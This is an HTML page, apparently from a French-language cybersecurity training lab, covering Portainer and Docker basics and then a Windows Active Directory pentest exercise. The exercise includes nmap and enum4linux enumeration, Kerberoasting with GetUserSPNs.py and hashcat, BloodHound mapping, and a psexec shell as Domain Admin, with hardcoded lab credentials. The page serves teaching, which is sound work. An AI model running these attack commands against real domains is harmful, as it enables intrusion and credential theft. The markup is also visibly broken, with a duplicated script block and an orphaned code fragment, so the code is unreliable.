üê≥ cyberlab_portainer: Bureau du syndic - votre poste de contr√¥le
üêß cyberlab_kali: Atelier de r√©paration - outils de pentesting

üìä Observations types:
   ‚Ä¢ Dashboard: faible CPU, trafic web constant
   ‚Ä¢ WebGoat: CPU moyen, Java gourmand en m√©moire
   ‚Ä¢ Kali: CPU variable selon utilisation outils`,

                3: `üéØ SOLUTION MODULE 3 - Plan de c√¢blage
                
‚úÖ Architecture r√©seau CyberLab:
üèóÔ∏è R√©seau principal: v100_cyberlab_network
üåê Type: bridge custom (r√©seau priv√© isol√©)
üìç Subnet: 172.35.0.0/24 (256 adresses possibles)
üö™ Gateway: 172.35.0.1 (sortie internet)

üè† Plan d'adressage logique:
   ‚Ä¢ 172.35.0.2    ‚Üí Portainer (syndic)
   ‚Ä¢ 172.35.0.20   ‚Üí Dashboard (r√©ception)
   ‚Ä¢ 172.35.0.80-83 ‚Üí Applications (√©tage formations)
   ‚Ä¢ 172.35.0.100  ‚Üí Kali (atelier sous-sol)
   
üí° Avantage: Communication interne rapide + isolation s√©curis√©e`,

                4: `üéØ SOLUTION MODULE 4 - Carnet de surveillance
                
‚úÖ Analyse des logs par service:
üì∞ Dashboard (nginx):
   ‚Ä¢ Format: IP - [timestamp] "GET /page" 200 size
   ‚Ä¢ Indique: visiteurs, pages acc√©d√©es, erreurs 404
   
‚òï WebGoat (Java Spring):
   ‚Ä¢ D√©marrage: "Started WebGoatApplication in X seconds"
   ‚Ä¢ Runtime: logs d'exercices, tentatives d'attaques
   
üîç Techniques de lecture:
   ‚Ä¢ Messages verts = OK, rouges = ERROR
   ‚Ä¢ Timestamps pour chronologie des √©v√©nements
   ‚Ä¢ Patterns r√©p√©titifs = probl√®mes r√©currents
   
üéÆ Test pratique: Restart ‚Üí observer s√©quence d√©marrage compl√®te`,

                5: `üéØ SOLUTION MODULE 5 - Plan d'architecte
                
‚úÖ Stack Docker Compose analys√©e:
üìã Fichier: docker-compose.yml (Bible de l'infrastructure)
üèóÔ∏è Stack name: "formation-cybersecurite" (nom du projet)

üè† Architecture d√©finie:
   ‚Ä¢ 13 services orchestr√©s automatiquement
   ‚Ä¢ D√©pendances entre services g√©r√©es
   ‚Ä¢ R√©seau bridge custom partag√©
   ‚Ä¢ Volumes persistants (mysql_data, wazuh_data)
   ‚Ä¢ Variables d'environnement centralis√©es
   
üéØ Puissance de Docker Compose:
   ‚Ä¢ 1 commande = d√©ploiement complet
   ‚Ä¢ Infrastructure as Code
   ‚Ä¢ Reproductibilit√© garantie
   ‚Ä¢ Gestion des versions simplifi√©e
   
üí° Portainer = GUI pour √©viter la ligne de commande !`
            };
            
            alert(solutions[moduleNum] || "Solution non disponible");
        }
    </script>
                    </div>
                </div>

                <!-- Module 5: Stacks -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">5</div>
                        <div class="step-title">Stacks & Docker Compose</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üèóÔ∏è Le "plan de construction" de la r√©sidence</div>
                            <div class="docker-concept">
                                <h4>üìã Analogie du plan d'architecte</h4>
                                <p><strong>Docker Compose = Plan de construction de l'immeuble</strong></p>
                                <ul style="margin-left: 20px;">
                                    <li>üèóÔ∏è <strong>Stack "formation-cybersecurite"</strong> = Plan complet de votre r√©sidence</li>
                                    <li>üè† <strong>Services (13)</strong> = Chaque appartement avec ses sp√©cifications</li>
                                    <li>üîå <strong>Networks</strong> = Plan de c√¢blage √©lectrique/internet</li>
                                    <li>üíæ <strong>Volumes</strong> = Caves de stockage (mysql_data, wazuh_data)</li>
                                    <li>‚öôÔ∏è <strong>Variables d'environnement</strong> = Configuration centralis√©e (comme le r√®glement int√©rieur)</li>
                                </ul>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0;">
                                    <strong>üéØ Avantage :</strong> Avec ce "plan", vous pouvez reconstruire toute la r√©sidence d'un coup ! Un seul fichier d√©crit comment assembler les 13 services, leurs connexions, leurs configurations.
                                </div>
                                
                                <div style="background: rgba(40,167,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0;">
                                    <strong>üîß Commandes magiques :</strong>
                                    <ul style="margin-left: 20px;">
                                        <li><code>docker-compose up</code> = Construire tout l'immeuble</li>
                                        <li><code>docker-compose down</code> = D√©truire l'immeuble</li>
                                        <li><code>docker-compose restart</code> = Red√©marrer tous les appartements</li>
                                    </ul>
                                </div>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 5.1: Lecture du plan d'architecte</div>
                                
                                <p><strong>üéØ Mission :</strong> D√©crypter le plan de construction ! Dans Portainer ‚Üí <strong>Stacks</strong> :</p>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üèóÔ∏è Stack : "formation-cybersecurite" (nom du projet)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üè† Services : 13 d√©finis (tous vos "appartements")</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üåê Networks : v100_cyberlab_network (le c√¢blage)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üíæ Volumes : mysql_data, wazuh_data (caves de stockage)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>‚öôÔ∏è Variables : configuration centralis√©e (r√®glement int√©rieur)</span>
                                    </div>
                                </div>
                                
                                <div style="background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,140,0,0.05)); border: 2px solid #ffd700; border-radius: 15px; padding: 15px; margin: 15px 0;">
                                    <p><strong>üéì Points cl√©s √† retenir :</strong></p>
                                    <ul style="margin-left: 20px;">
                                        <li>üìã Le fichier <code>docker-compose.yml</code> = Bible de votre infrastructure</li>
                                        <li>üîÑ Tout est reproductible : supprimez tout, relancez ‚Üí identique !</li>
                                        <li>üéõÔ∏è Portainer vous √©vite de taper les commandes en ligne</li>
                                        <li>üìä Vue d'ensemble : relations entre services visibles</li>
                                    </ul>
                                </div>
                                
                                <button class="btn btn-warning" onclick="showPortainerSolution(5)">üí° Solution</button>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <!-- JavaScript pour solutions -->
    <script>
        function showPortainerSolution(moduleNum) {
            const solutions = {
                1: `üéØ SOLUTION MODULE 1 - Premi√®re visite du syndic
                
‚úÖ Interface Portainer d√©couverte:
üìã Dashboard principal:
   ‚Ä¢ ~13 containers actifs (tous vos locataires)
   ‚Ä¢ M√©triques temps r√©el (consommation)
   ‚Ä¢ Statut global de la r√©sidence
   
üß≠ Sections importantes:
   ‚Ä¢ Containers = Liste des appartements
   ‚Ä¢ Images = Catalogue des "types d'appartement"
   ‚Ä¢ Networks = Plan de c√¢blage
   ‚Ä¢ Volumes = Caves de stockage
   ‚Ä¢ Stacks = Plan d'architecte complet

üí° Premi√®re impression: Interface intuitive, tout est visuel !`,

                2: `üéØ SOLUTION MODULE 2 - Inventaire des locataires
                
‚úÖ Services CyberLab identifi√©s:
üåê cyberlab_dashboard: R√©ception (nginx) - point d'entr√©e principal
üéØ cyberlab_webgoat: Salle de formation OWASP - apprentissage interactif
üõ°Ô∏è cyberlab_dvwa: Laboratoire PHP - tests de vuln√©rabilit√©s
üçé cyberlab_juice_shop: Boutique e-commerce - challenges modernes
üê≥ cyberlab_portainer: Bureau du syndic - votre poste de contr√¥le
üêß cyberlab_kali: Atelier de r√©paration - outils de pentesting

üìä Observations types:
   ‚Ä¢ Dashboard: faible CPU, trafic web constant
   ‚Ä¢ WebGoat: CPU moyen, Java gourmand en m√©moire
   ‚Ä¢ Kali: CPU variable selon utilisation outils`,

                3: `üéØ SOLUTION MODULE 3 - Plan de c√¢blage
                
‚úÖ Architecture r√©seau CyberLab:
üèóÔ∏è R√©seau principal: v100_cyberlab_network
üåê Type: bridge custom (r√©seau priv√© isol√©)
üìç Subnet: 172.35.0.0/24 (256 adresses possibles)
üö™ Gateway: 172.35.0.1 (sortie internet)

üè† Plan d'adressage logique:
   ‚Ä¢ 172.35.0.2    ‚Üí Portainer (syndic)
   ‚Ä¢ 172.35.0.20   ‚Üí Dashboard (r√©ception)
   ‚Ä¢ 172.35.0.80-83 ‚Üí Applications (√©tage formations)
   ‚Ä¢ 172.35.0.100  ‚Üí Kali (atelier sous-sol)
   
üí° Avantage: Communication interne rapide + isolation s√©curis√©e`,

                4: `üéØ SOLUTION MODULE 4 - Carnet de surveillance
                
‚úÖ Analyse des logs par service:
üì∞ Dashboard (nginx):
   ‚Ä¢ Format: IP - [timestamp] "GET /page" 200 size
   ‚Ä¢ Indique: visiteurs, pages acc√©d√©es, erreurs 404
   
‚òï WebGoat (Java Spring):
   ‚Ä¢ D√©marrage: "Started WebGoatApplication in X seconds"
   ‚Ä¢ Runtime: logs d'exercices, tentatives d'attaques
   
üîç Techniques de lecture:
   ‚Ä¢ Messages verts = OK, rouges = ERROR
   ‚Ä¢ Timestamps pour chronologie des √©v√©nements
   ‚Ä¢ Patterns r√©p√©titifs = probl√®mes r√©currents
   
üéÆ Test pratique: Restart ‚Üí observer s√©quence d√©marrage compl√®te`,

                5: `üéØ SOLUTION MODULE 5 - Plan d'architecte
                
‚úÖ Stack Docker Compose analys√©e:
üìã Fichier: docker-compose.yml (Bible de l'infrastructure)
üèóÔ∏è Stack name: "formation-cybersecurite" (nom du projet)

üè† Architecture d√©finie:
   ‚Ä¢ 13 services orchestr√©s automatiquement
   ‚Ä¢ D√©pendances entre services g√©r√©es
   ‚Ä¢ R√©seau bridge custom partag√©
   ‚Ä¢ Volumes persistants (mysql_data, wazuh_data)
   ‚Ä¢ Variables d'environnement centralis√©es
   
üéØ Puissance de Docker Compose:
   ‚Ä¢ 1 commande = d√©ploiement complet
   ‚Ä¢ Infrastructure as Code
   ‚Ä¢ Reproductibilit√© garantie
   ‚Ä¢ Gestion des versions simplifi√©e
   
üí° Portainer = GUI pour √©viter la ligne de commande !`
            };
            
            alert(solutions[moduleNum] || "Solution non disponible");
        }
    </script>
- Services: d√©finition des 13 conteneurs
- Networks & Volumes: infrastructure partag√©e
- Variables: configuration centralis√©e`
            };
            
            alert(solutions[moduleNum] || "Solution non disponible");
        }
    </script>
    <div class="tab-content" id="phpmyadmin">
        <div class="service-overview">
            <h2>üóÑÔ∏è phpMyAdmin</h2>
            <p>Guide de d√©couverte phpMyAdmin - <em>En cours de d√©veloppement...</em></p>
        </div>
    </div>

    <!-- Windows AD Lab Tab -->
    <div class="tab-content" id="winlab">
        <div class="portainer-page">
            <div class="page-header">
                <div class="page-title">üñ•Ô∏è Windows Active Directory Lab</div>
                <p>Environnement de domaine Windows vuln√©rable pour pentest avanc√©</p>
                <div class="lab-stats" style="margin-top: 15px;">
                    <div class="stat-item">
                        <div class="stat-number">1</div>
                        <div class="stat-label">Domain Controller</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">3</div>
                        <div class="stat-label">Clients Windows</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">15+</div>
                        <div class="stat-label">Vuln√©rabilit√©s</div>
                    </div>
                </div>
            </div>

            <div class="learning-path">
                
                <!-- √âtape 1: Architecture & D√©ploiement -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">1</div>
                        <div class="step-title">Architecture & D√©ploiement du Domaine</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Architecture Active Directory</div>
                            
                            <div class="docker-concept">
                                <h4>üè¢ Structure du Lab CYBERLAB.LOCAL</h4>
                                <p><strong>Domaine :</strong> CYBERLAB.LOCAL<br>
                                <strong>DC :</strong> WIN-DC01 (172.35.0.10)<br>
                                <strong>Clients :</strong> WIN-CLI01/02/03 (172.35.0.11-13)<br>
                                <strong>Kali Attaquant :</strong> cyberlab_kali_attacker (172.35.0.100)</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üéØ Objectifs d'Apprentissage</h4>
                                <p>
                                ‚Ä¢ Comprendre les services AD (DNS, Kerberos, LDAP)<br>
                                ‚Ä¢ Ma√Ætriser les attaques post-exploitation<br>
                                ‚Ä¢ Utiliser BloodHound pour la cartographie<br>
                                ‚Ä¢ Exploiter les vuln√©rabilit√©s Windows communes
                                </p>
                            </div>
                            
                            <ul class="objectives-list">
                                <li>D√©ployer l'environnement Windows</li>
                                <li>Configurer le domaine Active Directory</li>
                                <li>Cr√©er les comptes utilisateurs vuln√©rables</li>
                                <li>Installer les outils d'attaque sur Kali</li>
                            </ul>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üõ†Ô∏è D√©ploiement du Lab Windows</div>
                            
                            <div class="terminal-sim">
                                <div class="terminal-header">
                                    <div class="terminal-dots">
                                        <div class="dot red"></div>
                                        <div class="dot yellow"></div>
                                        <div class="dot green"></div>
                                    </div>
                                    D√©ploiement Windows AD Lab
                                </div>
                                <div class="terminal-body">
                                    <div class="command">$ cd ~/cyberlab/versions/v1.0.0</div>
                                    <div class="command">$ docker-compose up -d win-dc01 win-cli01 win-cli02</div>
                                    <div class="output">Creating cyberlab_win_dc01 ... done
Creating cyberlab_win_cli01 ... done
Creating cyberlab_win_cli02 ... done</div>
                                    <div class="command">$ docker ps | grep win</div>
                                    <div class="output">cyberlab_win_dc01    Up 2 minutes   0.0.0.0:3389->3389/tcp
cyberlab_win_cli01   Up 2 minutes   0.0.0.0:3390->3389/tcp</div>
                                </div>
                            </div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 1: D√©ploiement Initial</div>
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>D√©marrer les conteneurs Windows (DC + Clients)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>V√©rifier connectivit√© RDP : localhost:3389 (DC)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Attendre promotion DC (~10 minutes)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Joindre les clients au domaine CYBERLAB.LOCAL</span>
                                    </div>
                                </div>
                                
                                <div class="tips-box">
                                    <h4>üîß Acc√®s RDP</h4>
                                    <p><strong>DC :</strong> localhost:3389 (Administrator/CyberLab2024!)<br>
                                    <strong>CLI01 :</strong> localhost:3390 (localuser/password123)<br>
                                    <strong>CLI02 :</strong> localhost:3391 (localuser/password123)</p>
                                </div>
                                
                                <div>
                                    <button class="btn btn-primary" onclick="deployWindowsLab()">üöÄ D√©ployer Lab Windows</button>
                                    <button class="btn btn-success" onclick="validateWinStep1()">‚úÖ Valider l'√©tape</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 2: Reconnaissance & Enum√©ration -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">2</div>
                        <div class="step-title">Reconnaissance & √ânum√©ration AD</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö √ânum√©ration Active Directory</div>
                            
                            <div class="docker-concept">
                                <h4>üîç Services √† √ânum√©rer</h4>
                                <p>
                                ‚Ä¢ <strong>Port 53 :</strong> DNS (noms de domaine)<br>
                                ‚Ä¢ <strong>Port 88 :</strong> Kerberos (authentication)<br>
                                ‚Ä¢ <strong>Port 139/445 :</strong> SMB (partages r√©seau)<br>
                                ‚Ä¢ <strong>Port 389 :</strong> LDAP (annuaire AD)<br>
                                ‚Ä¢ <strong>Port 3389 :</strong> RDP (acc√®s distant)
                                </p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üõ†Ô∏è Outils d'√ânum√©ration</h4>
                                <p>
                                ‚Ä¢ <strong>nmap :</strong> Scan ports et services<br>
                                ‚Ä¢ <strong>enum4linux :</strong> Enum√©ration SMB/NetBIOS<br>
                                ‚Ä¢ <strong>ldapsearch :</strong> Requ√™tes LDAP<br>
                                ‚Ä¢ <strong>smbclient :</strong> Acc√®s aux partages
                                </p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üîç √ânum√©ration Pratique</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 2: Reconnaissance R√©seau</div>
                                
                                <div class="terminal-sim">
                                    <div class="terminal-header">
                                        <div class="terminal-dots">
                                            <div class="dot red"></div>
                                            <div class="dot yellow"></div>
                                            <div class="dot green"></div>
                                        </div>
                                        Kali Linux - √ânum√©ration AD
                                    </div>
                                    <div class="terminal-body">
                                        <div class="command">$ nmap -sV -p 53,88,135,139,389,445,636,3268,3389 172.35.0.10</div>
                                        <div class="output">PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Windows Kerberos
139/tcp  open  netbios-ssn  Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows AD LDAP
445/tcp  open  microsoft-ds Windows Server 2019 DC</div>
                                        <div class="command">$ enum4linux -a 172.35.0.10</div>
                                        <div class="output">[+] Domain Information:
Domain Name: CYBERLAB
Domain SID: S-1-5-21-xxx-xxx-xxx</div>
                                    </div>
                                </div>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Scanner le DC avec nmap (ports AD classiques)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>√ânum√©rer avec enum4linux (users, groups, shares)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Lister les partages SMB anonymes</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>D√©couvrir les utilisateurs du domaine</span>
                                    </div>
                                </div>
                                
                                <div>
                                    <button class="btn btn-primary" onclick="openKaliTerminal()">üñ•Ô∏è Acc√®s Kali</button>
                                    <button class="btn btn-warning" onclick="copyEnumCommands()">üìã Copier Commandes</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 3: Attaques Kerberos -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">3</div>
                        <div class="step-title">Attaques Kerberos (Kerberoasting & ASREPRoasting)</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Attaques Kerberos</div>
                            
                            <div class="docker-concept">
                                <h4>üé´ Kerberoasting</h4>
                                <p>Attaque contre les comptes de service (SPN) pour r√©cup√©rer les hashes TGS et les casser offline avec hashcat/john.</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üé™ ASREPRoasting</h4>
                                <p>Exploitation des comptes avec "Do not require Kerberos preauthentication" pour obtenir des hashes AS-REP.</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üîì Comptes Vuln√©rables Configur√©s</h4>
                                <p>
                                ‚Ä¢ <strong>svc-web :</strong> Service HTTP/web avec SPN<br>
                                ‚Ä¢ <strong>svc-sql :</strong> Service SQL avec SPN<br>
                                ‚Ä¢ <strong>user-nopreauth :</strong> Compte sans pr√©-auth<br>
                                ‚Ä¢ <strong>admin-weak :</strong> Admin avec mot de passe faible
                                </p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üéØ Exploitation Kerberos</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 3: Kerberoasting Attack</div>
                                
                                <div class="terminal-sim">
                                    <div class="terminal-header">
                                        <div class="terminal-dots">
                                            <div class="dot red"></div>
                                            <div class="dot yellow"></div>
                                            <div class="dot green"></div>
                                        </div>
                                        Impacket - Kerberoasting
                                    </div>
                                    <div class="terminal-body">
                                        <div class="command">$ GetUserSPNs.py CYBERLAB.LOCAL/user1:password123 -dc-ip 172.35.0.10</div>
                                        <div class="output">[*] Discovering SPN accounts...
ServicePrincipalName    Name     MemberOf
HTTP/web.cyberlab.local svc-web  CN=Service Accounts,CN=Users</div>
                                        <div class="command">$ GetUserSPNs.py CYBERLAB.LOCAL/user1:password123 -dc-ip 172.35.0.10 -request</div>
                                        <div class="output">$krb5tgs$23$*svc-web$CYBERLAB.LOCAL$HTTP/web*$...</div>
                                        <div class="command">$ hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt</div>
                                    </div>
                                </div>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>√ânum√©rer les SPNs avec GetUserSPNs.py</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>R√©cup√©rer les tickets TGS (-request)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Casser les hashes avec hashcat</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Tenter ASREPRoasting avec GetNPUsers.py</span>
                                    </div>
                                </div>
                                
                                <div class="tips-box">
                                    <h4>üîê Credentials d'acc√®s initial</h4>
                                    <p><strong>user1:</strong>password123 (utilisateur domaine basique)<br>
                                    <strong>guest:</strong> (compte invit√© activ√©)<br>
                                    <strong>Null session:</strong> SMB anonyme activ√©</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 4: Mouvement Lat√©ral & BloodHound -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">4</div>
                        <div class="step-title">Mouvement Lat√©ral & Cartographie BloodHound</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Cartographie & Mouvement Lat√©ral</div>
                            
                            <div class="docker-concept">
                                <h4>ü©∏ BloodHound</h4>
                                <p>Outil de cartographie des relations Active Directory pour identifier les chemins d'attaque vers les comptes privil√©gi√©s.</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üîÑ Techniques de Mouvement</h4>
                                <p>
                                ‚Ä¢ <strong>Pass-the-Hash :</strong> Utilisation des hashes NTLM<br>
                                ‚Ä¢ <strong>Pass-the-Ticket :</strong> R√©utilisation tickets Kerberos<br>
                                ‚Ä¢ <strong>Golden Ticket :</strong> Forge de tickets Kerberos<br>
                                ‚Ä¢ <strong>DCSync :</strong> Extraction des hashes via replication
                                </p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">ü©∏ BloodHound & Post-Exploitation</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 4: Cartographie du Domaine</div>
                                
                                <div class="terminal-sim">
                                    <div class="terminal-header">
                                        <div class="terminal-dots">
                                            <div class="dot red"></div>
                                            <div class="dot yellow"></div>
                                            <div class="dot green"></div>
                                        </div>
                                        BloodHound Collection
                                    </div>
                                    <div class="terminal-body">
                                        <div class="command">$ bloodhound-python -d CYBERLAB.LOCAL -u user1 -p password123 -gc WIN-DC01.CYBERLAB.LOCAL -c all</div>
                                        <div class="output">[*] Connecting to LDAP server: WIN-DC01.CYBERLAB.LOCAL
[*] Found 1 domains
[*] Found 1 domains in the forest
[*] Generating computers.json
[*] Generating users.json</div>
                                        <div class="command">$ sudo neo4j console</div>
                                        <div class="command">$ bloodhound</div>
                                        <div class="output">[Interface BloodHound s'ouvre]</div>
                                    </div>
                                </div>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Collecter les donn√©es AD avec bloodhound-python</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>D√©marrer Neo4j et BloodHound GUI</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Importer les donn√©es JSON dans BloodHound</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Analyser "Shortest path to Domain Admins"</span>
                                    </div>
                                </div>
                                
                                <div class="tips-box">
                                    <h4>üéØ Chemins d'attaque pr√©par√©s</h4>
                                    <p><strong>user1 ‚Üí svc-web :</strong> Kerberoasting<br>
                                    <strong>svc-web ‚Üí admin-weak :</strong> Droits GenericWrite<br>
                                    <strong>admin-weak ‚Üí Domain Admins :</strong> Membre du groupe</p>
                                </div>
                                
                                <div>
                                    <button class="btn btn-primary" onclick="startBloodHound()">ü©∏ D√©marrer BloodHound</button>
                                    <button class="btn btn-warning" onclick="downloadBloodHoundData()">üì• T√©l√©charger Donn√©es</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 5: Escalade de Privil√®ges -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">5</div>
                        <div class="step-title">Escalade de Privil√®ges & Domain Admin</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Escalade de Privil√®ges AD</div>
                            
                            <div class="docker-concept">
                                <h4>üëë Objectif: Domain Admin</h4>
                                <p>Techniques d'escalade configur√©es dans le lab pour atteindre les privil√®ges Domain Administrator.</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üîê Techniques Disponibles</h4>
                                <p>
                                ‚Ä¢ <strong>GPO Abuse :</strong> Modification des GPO<br>
                                ‚Ä¢ <strong>Constrained Delegation :</strong> S4U2Proxy<br>
                                ‚Ä¢ <strong>Unconstrained Delegation :</strong> Capture de tickets<br>
                                ‚Ä¢ <strong>ACL Abuse :</strong> GenericAll/GenericWrite
                                </p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üëë Chemin vers Domain Admin</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 5: Exploitation Finale</div>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Exploiter les droits GenericWrite sur admin-weak</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Modifier le mot de passe ou ajouter un SPN</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Utiliser les credentials admin-weak</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Obtenir un shell en tant que Domain Admin</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Exfiltrer les secrets AD (DCSync)</span>
                                    </div>
                                </div>
                                
                                <div class="terminal-sim">
                                    <div class="terminal-header">
                                        <div class="terminal-dots">
                                            <div class="dot red"></div>
                                            <div class="dot yellow"></div>
                                            <div class="dot green"></div>
                                        </div>
                                        Domain Admin Achievement
                                    </div>
                                    <div class="terminal-body">
                                        <div class="command">$ psexec.py CYBERLAB/admin-weak:newpassword123@172.35.0.10</div>
                                        <div class="output">[*] Requesting shares on 172.35.0.10.....
[*] Found writable share ADMIN$
[*] Uploading file [...] 
[*] Opening SVCManager on 172.35.0.10.....
[*] Starting service [...] on 172.35.0.10.....
[*] Got shell! üéâ</div>
                                        <div class="command">C:\Windows\system32> whoami</div>
                                        <div class="output">cyberlab\admin-weak</div>
                                        <div class="command">C:\Windows\system32> net group "Domain Admins" /domain</div>
                                    </div>
                                </div>
                                
                                <div style="background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,140,0,0.05)); border: 2px solid #ffd700; border-radius: 15px; padding: 20px; margin: 20px 0;">
                                    <h4 style="color: #ffd700; margin-bottom: 15px;">üèÜ MISSION ACCOMPLIE !</h4>
                                    <p>F√©licitations ! Vous avez compromis enti√®rement le domaine CYBERLAB.LOCAL !</p>
                                    <p><strong>Techniques ma√Ætris√©es :</strong> √ânum√©ration, Kerberoasting, BloodHound, Escalade de privil√®ges</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <script>
        // Navigation entre onglets
        function showTab(tabName) {
            // Cacher tous les contenus
            const contents = document.querySelectorAll('.tab-content');
            contents.forEach(content => content.classList.remove('active'));
            
            // D√©sactiver tous les onglets
            const tabs = document.querySelectorAll('.tab');
            tabs.forEach(tab => tab.classList.remove('active'));
            
            // Afficher le contenu s√©lectionn√©
            document.getElementById(tabName).classList.add('active');
            
            // Activer l'onglet s√©lectionn√©
            event.target.classList.add('active');
        }

        // Syst√®me de checkbox
        function toggleCheck(element) {
            element.classList.toggle('checked');
            
            // Compter les cases coch√©es dans la section
            const section = element.closest('.step-card');
            if (section) {
                const checkboxes = section.querySelectorAll('.checkbox');
                const checkedBoxes = section.querySelectorAll('.checkbox.checked');
                
                if (checkedBoxes.length === checkboxes.length) {
                    // Toutes les cases coch√©es - effet de succ√®s
                    section.style.border = '2px solid #28a745';
                    setTimeout(() => {
                        section.style.border = '';
                    }, 2000);
                }
            }
        }

        // Validation des √©tapes
        function validateStep1() {
            const checkboxes = document.querySelectorAll('#portainer .step-card:first-child .checkbox.checked');
            if (checkboxes.length >= 3) {
                alert('üéâ √âtape 1 valid√©e ! Vous ma√Ætrisez les bases de Portainer.\n\n‚úÖ Prochaine √©tape : Explorez les conteneurs CyberLab');
            } else {
                alert('‚ö†Ô∏è Compl√©tez d\'abord toutes les actions de l\'√©tape 1');
            }
        }

